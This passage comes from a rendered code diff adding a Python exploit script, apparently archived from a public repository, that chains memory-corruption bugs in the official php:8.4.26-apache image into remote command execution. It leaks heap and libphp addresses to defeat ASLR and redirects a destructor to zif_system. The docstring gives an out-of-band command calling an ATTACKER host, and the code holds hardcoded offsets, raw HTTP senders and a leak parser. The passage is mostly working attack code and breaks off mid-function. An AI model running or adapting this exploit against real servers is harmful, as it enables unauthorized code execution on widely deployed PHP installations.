+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span><span class=lnt>213
+</span><span class=lnt>214
+</span><span class=lnt>215
+</span><span class=lnt>216
+</span><span class=lnt>217
+</span><span class=lnt>218
+</span><span class=lnt>219
+</span><span class=lnt>220
+</span><span class=lnt>221
+</span><span class=lnt>222
+</span><span class=lnt>223
+</span><span class=lnt>224
+</span><span class=lnt>225
+</span><span class=lnt>226
+</span><span class=lnt>227
+</span><span class=lnt>228
+</span><span class=lnt>229
+</span><span class=lnt>230
+</span><span class=lnt>231
+</span><span class=lnt>232
+</span><span class=lnt>233
+</span><span class=lnt>234
+</span><span class=lnt>235
+</span><span class=lnt>236
+</span><span class=lnt>237
+</span><span class=lnt>238
+</span><span class=lnt>239
+</span><span class=lnt>240
+</span><span class=lnt>241
+</span><span class=lnt>242
+</span><span class=lnt>243
+</span><span class=lnt>244
+</span><span class=lnt>245
+</span><span class=lnt>246
+</span><span class=lnt>247
+</span><span class=lnt>248
+</span><span class=lnt>249
+</span><span class=lnt>250
+</span><span class=lnt>251
+</span><span class=lnt>252
+</span><span class=lnt>253
+</span><span class=lnt>254
+</span><span class=lnt>255
+</span><span class=lnt>256
+</span><span class=lnt>257
+</span><span class=lnt>258
+</span><span class=lnt>259
+</span><span class=lnt>260
+</span><span class=lnt>261
+</span><span class=lnt>262
+</span><span class=lnt>263
+</span><span class=lnt>264
+</span><span class=lnt>265
+</span><span class=lnt>266
+</span><span class=lnt>267
+</span><span class=lnt>268
+</span><span class=lnt>269
+</span><span class=lnt>270
+</span><span class=lnt>271
+</span><span class=lnt>272
+</span><span class=lnt>273
+</span><span class=lnt>274
+</span><span class=lnt>275
+</span><span class=lnt>276
+</span><span class=lnt>277
+</span><span class=lnt>278
+</span><span class=lnt>279
+</span><span class=lnt>280
+</span><span class=lnt>281
+</span><span class=lnt>282
+</span><span class=lnt>283
+</span><span class=lnt>284
+</span><span class=lnt>285
+</span><span class=lnt>286
+</span><span class=lnt>287
+</span><span class=lnt>288
+</span><span class=lnt>289
+</span><span class=lnt>290
+</span><span class=lnt>291
+</span><span class=lnt>292
+</span><span class=lnt>293
+</span><span class=lnt>294
+</span><span class=lnt>295
+</span><span class=lnt>296
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=c1># Archived for authorized security research only.</span>
+</span></span><span class=line><span class=cl><span class=c1># Source: https://github.com/9bie/php2shell-bypass-aslr-exp (no explicit upstream license)</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;One-shot pure-HTTP exploit for official php:8.4.26-apache, 128M,
+</span></span></span><span class=line><span class=cl><span class=s2>display_errors=Off (no gdb, no target-side files).
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>  A1  : END-cleanup send_cookie OOM            (mk_a1.py, chunked)
+</span></span></span><span class=line><span class=cl><span class=s2>  B1  : stale-id OOB read -&gt; chunk base + libphp base (mk_leak_b.py, chunked)
+</span></span></span><span class=line><span class=cl><span class=s2>  A2  : cheap-OOM -&gt; dangling PS(http_session_vars)
+</span></span></span><span class=line><span class=cl><span class=s2>  B2  : fake reference + fake zend_array -&gt; pDestructor = zif_system
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>The proof command (default `id&gt;/out/p1`) runs inside the target.  For a
+</span></span></span><span class=line><span class=cl><span class=s2>remote target use an out-of-band command, e.g.
+</span></span></span><span class=line><span class=cl><span class=s2>  --cmd &#39;php -r &#34;file_get_contents(</span><span class=se>\\</span><span class=s2>&#34;http://ATTACKER/ok</span><span class=se>\\</span><span class=s2>&#34;);&#34;&#39;
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>usage:
+</span></span></span><span class=line><span class=cl><span class=s2>  python3 exploit.py --port 18110 --restart p2s-pure-18110
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>`pure/pwn_pure.py` is kept as a compatibility alias for this entry point.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>For the stock official prefork config (MaxRequestWorkers=150), the exploit
+</span></span></span><span class=line><span class=cl><span class=s2>holds `--workers - 1` partial requests open so the four chain requests are
+</span></span></span><span class=line><span class=cl><span class=s2>served by the same child.  Use `--workers 1` for the old single-worker lab.
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>__future__</span> <span class=kn>import</span> <span class=n>annotations</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tempfile</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>Counter</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>HERE</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>abspath</span><span class=p>(</span><span class=vm>__file__</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>R</span> <span class=o>=</span> <span class=n>HERE</span>
+</span></span><span class=line><span class=cl><span class=n>PURE</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>HERE</span><span class=p>,</span> <span class=s2>&#34;pure&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>Q</span> <span class=o>=</span> <span class=s2>&#34;?q0000000=v&amp;q0000001=v&amp;q0000002=v&amp;q0000003=v&amp;q0000004=v&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>LEAK_SPEC</span> <span class=o>=</span> <span class=s2>&#34;,&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s2>&#34;G:511:0x137&#34;</span><span class=p>]</span> <span class=o>*</span> <span class=mi>14</span> <span class=o>+</span> <span class=p>[</span><span class=s2>&#34;G:400:0x137&#34;</span><span class=p>,</span> <span class=s2>&#34;G:511:0x137&#34;</span><span class=p>,</span> <span class=s2>&#34;X:900&#34;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=c1># pointers-to-main-chunk fingerprint in the LEAK_SPEC window (stable count)</span>
+</span></span><span class=line><span class=cl><span class=n>MAIN_BUCKET_COUNT</span> <span class=o>=</span> <span class=mi>87</span>
+</span></span><span class=line><span class=cl><span class=n>PROFILES</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;x86_64&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;dtor_offset&#34;</span><span class=p>:</span> <span class=mh>0x65EB60</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;zif_offset&#34;</span><span class=p>:</span> <span class=mh>0x465370</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;ptr_max&#34;</span><span class=p>:</span> <span class=mh>0x7FFFFFFFFFFF</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;delta_min&#34;</span><span class=p>:</span> <span class=mh>0x1A00000</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;delta_max&#34;</span><span class=p>:</span> <span class=mh>0x1F00000</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;aarch64&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;dtor_offset&#34;</span><span class=p>:</span> <span class=mh>0x63812B</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;zif_offset&#34;</span><span class=p>:</span> <span class=mh>0x42CD70</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;ptr_max&#34;</span><span class=p>:</span> <span class=mh>0xFFFFFFFFFFFF</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;delta_min&#34;</span><span class=p>:</span> <span class=mh>0x1F00000</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;delta_max&#34;</span><span class=p>:</span> <span class=mh>0x2300000</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_chunked</span><span class=p>(</span><span class=n>port</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>body_file</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>timeout</span><span class=p>:</span> <span class=nb>float</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                 <span class=n>save</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>cmd</span> <span class=o>=</span> <span class=p>[</span><span class=n>sys</span><span class=o>.</span><span class=n>executable</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>PURE</span><span class=p>,</span> <span class=s2>&#34;chunked_send.py&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>           <span class=s2>&#34;--port&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>port</span><span class=p>),</span> <span class=s2>&#34;--body-file&#34;</span><span class=p>,</span> <span class=n>body_file</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>           <span class=s2>&#34;--path&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=s2>&#34;--timeout&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>timeout</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>save</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>cmd</span> <span class=o>+=</span> <span class=p>[</span><span class=s2>&#34;--save-response&#34;</span><span class=p>,</span> <span class=n>save</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>open</span><span class=p>(</span><span class=n>save</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span> <span class=k>if</span> <span class=n>save</span> <span class=k>else</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_plain</span><span class=p>(</span><span class=n>port</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>body</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>timeout</span><span class=p>:</span> <span class=nb>float</span> <span class=o>=</span> <span class=mf>120.0</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>req</span> <span class=o>=</span> <span class=p>(</span><span class=s2>&#34;POST </span><span class=si>%s</span><span class=s2> HTTP/1.1</span><span class=se>\r\n</span><span class=s2>Host: 127.0.0.1:</span><span class=si>%d</span><span class=se>\r\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>           <span class=s2>&#34;Content-Type: multipart/form-data; boundary=</span><span class=si>%s</span><span class=se>\r\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>           <span class=s2>&#34;Content-Length: </span><span class=si>%d</span><span class=se>\r\n</span><span class=s2>Connection: close</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span> <span class=o>%</span>
+</span></span><span class=line><span class=cl>           <span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=s2>&#34;C&#34;</span> <span class=o>*</span> <span class=mi>10</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>body</span><span class=p>)))</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>create_connection</span><span class=p>((</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=n>port</span><span class=p>),</span> <span class=n>timeout</span><span class=o>=</span><span class=n>timeout</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>settimeout</span><span class=p>(</span><span class=n>timeout</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>req</span> <span class=o>+</span> <span class=n>body</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>out</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>4</span> <span class=o>&lt;&lt;</span> <span class=mi>20</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>chunk</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>65536</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>chunk</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>
+</span></span><span class=line><span class=cl>            <span class=n>out</span><span class=o>.</span><span class=n>extend</span><span class=p>(</span><span class=n>chunk</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>pass</span>
+</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_leak</span><span class=p>(</span><span class=n>resp</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>profile</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Set-Cookie: PHPSESSID=&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s2>&#34;no Set-Cookie in leak response (</span><span class=si>%d</span><span class=s2> bytes)&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>resp</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>val</span> <span class=o>=</span> <span class=n>resp</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=s2>&#34;Set-Cookie: PHPSESSID=&#34;</span><span class=p>):]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>dec</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>unquote_to_bytes</span><span class=p>(</span><span class=n>val</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;latin1&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>counts</span> <span class=o>=</span> <span class=n>Counter</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>ptr_max</span> <span class=o>=</span> <span class=n>profile</span><span class=p>[</span><span class=s2>&#34;ptr_max&#34;</span><span class=p>]</span> <span class=k>if</span> <span class=n>profile</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span> <span class=k>else</span> <span class=mh>0xFFFFFFFFFFFF</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>off</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>dec</span><span class=p>)</span> <span class=o>-</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>8</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>q</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>dec</span><span class=p>,</span> <span class=n>off</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=mh>0x7F0000000000</span> <span class=o>&lt;=</span> <span class=n>q</span> <span class=o>&lt;=</span> <span class=n>ptr_max</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>counts</span><span class=p>[</span><span class=n>q</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>counts</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s2>&#34;no heap pointers in leak window&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>zdtor</span><span class=p>,</span> <span class=n>n</span> <span class=o>=</span> <span class=n>counts</span><span class=o>.</span><span class=n>most_common</span><span class=p>(</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>profile</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;aarch64&#34;</span> <span class=k>if</span> <span class=n>zdtor</span> <span class=o>&gt;</span> <span class=mh>0x7FFFFFFFFFFF</span> <span class=k>else</span> <span class=s2>&#34;x86_64&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>profile</span> <span class=o>=</span> <span class=n>PROFILES</span><span class=p>[</span><span class=n>arch</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>arch</span> <span class=o>=</span> <span class=nb>next</span><span class=p>((</span><span class=n>name</span> <span class=k>for</span> <span class=n>name</span><span class=p>,</span> <span class=n>prof</span> <span class=ow>in</span> <span class=n>PROFILES</span><span class=o>.</span><span class=n>items</span><span class=p>()</span> <span class=k>if</span> <span class=n>prof</span> <span class=ow>is</span> <span class=n>profile</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;unknown&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>profile</span><span class=p>[</span><span class=s2>&#34;ptr_max&#34;</span><span class=p>]</span> <span class=o>!=</span> <span class=mh>0xFFFFFFFFFFFF</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>counts</span> <span class=o>=</span> <span class=n>Counter</span><span class=p>({</span><span class=n>q</span><span class=p>:</span> <span class=n>c</span> <span class=k>for</span> <span class=n>q</span><span class=p>,</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>counts</span><span class=o>.</span><span class=n>items</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>                          <span class=k>if</span> <span class=n>q</span> <span class=o>&lt;=</span> <span class=n>profile</span><span class=p>[</span><span class=s2>&#34;ptr_max&#34;</span><span class=p>]})</span>
+</span></span><span class=line><span class=cl>    <span class=n>lib</span> <span class=o>=</span> <span class=n>zdtor</span> <span class=o>-</span> <span class=n>profile</span><span class=p>[</span><span class=s2>&#34;dtor_offset&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>buckets</span> <span class=o>=</span> <span class=n>Counter</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>bucket_first</span> <span class=o>=</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>q</span><span class=p>,</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>counts</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=n>q</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mh>0x1FFFFF</span>
+</span></span><span class=line><span class=cl>        <span class=n>buckets</span><span class=p>[</span><span class=n>b</span><span class=p>]</span> <span class=o>+=</span> <span class=n>c</span>
+</span></span><span class=line><span class=cl>        <span class=n>bucket_first</span><span class=o>.</span><span class=n>setdefault</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=n>q</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># drop the libphp bucket and the dominant id-chunk bucket</span>
+</span></span><span class=line><span class=cl>    <span class=n>lib_bucket</span> <span class=o>=</span> <span class=n>zdtor</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mh>0x1FFFFF</span>
+</span></span><span class=line><span class=cl>    <span class=n>id_bucket</span> <span class=o>=</span> <span class=n>buckets</span><span class=o>.</span><span class=n>most_common</span><span class=p>(</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>cands</span> <span class=o>=</span> <span class=p>[(</span><span class=n>b</span><span class=p>,</span> <span class=n>c</span><span class=p>)</span> <span class=k>for</span> <span class=n>b</span><span class=p>,</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>buckets</span><span class=o>.</span><span class=n>most_common</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>             <span class=k>if</span> <span class=n>b</span> <span class=ow>not</span> <span class=ow>in</span> <span class=p>(</span><span class=n>lib_bucket</span><span class=p>,</span> <span class=n>id_bucket</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=c1># prefer the bucket whose pointer count matches the stable fingerprint</span>
+</span></span><span class=line><span class=cl>    <span class=n>cands</span><span class=o>.</span><span class=n>sort</span><span class=p>(</span><span class=n>key</span><span class=o>=</span><span class=k>lambda</span> <span class=n>bc</span><span class=p>:</span> <span class=p>(</span><span class=nb>abs</span><span class=p>(</span><span class=n>bc</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>-</span> <span class=n>MAIN_BUCKET_COUNT</span><span class=p>),</span> <span class=n>bc</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;decoded&#34;</span><span class=p>:</span> <span class=nb>len</span><span class=p>(</span><span class=n>dec</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;arch&#34;</span><span class=p>:</span> <span class=n>arch</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;profile&#34;</span><span class=p>:</span> <span class=n>profile</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;zdtor&#34;</span><span class=p>:</span> <span class=n>zdtor</span><span class=p>,</span>
